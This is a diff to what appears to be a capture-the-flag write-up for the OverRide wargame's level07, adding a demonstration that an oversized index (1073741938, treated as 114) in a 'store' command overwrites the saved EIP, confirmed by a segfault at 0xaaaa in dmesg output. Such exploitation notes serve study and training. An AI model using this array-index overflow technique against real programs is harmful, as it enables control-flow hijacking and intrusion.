@@ -67,6 +67,17 @@ index : get_index.c
 The binary removes the environment variable and also there is a protection on 
 the stack. It's called STACK CANARY.
 
+We can control EIP at index 114 : 
+
+Input command: store
+ Number: 43690    (AAAA in hexa)
+ Index: 1073741938   (114)
+ Completed store command successfully
+Input command: quit
+Segmentation fault (core dumped)
+level07@OverRide:~$ dmesg | tail -1
+[20188.619816] level07[3217]: segfault at aaaa ip 000000000000aaaa sp 00000000ffffd720 error 14 in level07[8048000+1000]
+
 As the array is 100 long, we can try to store number after that range by storing 
 at :
 
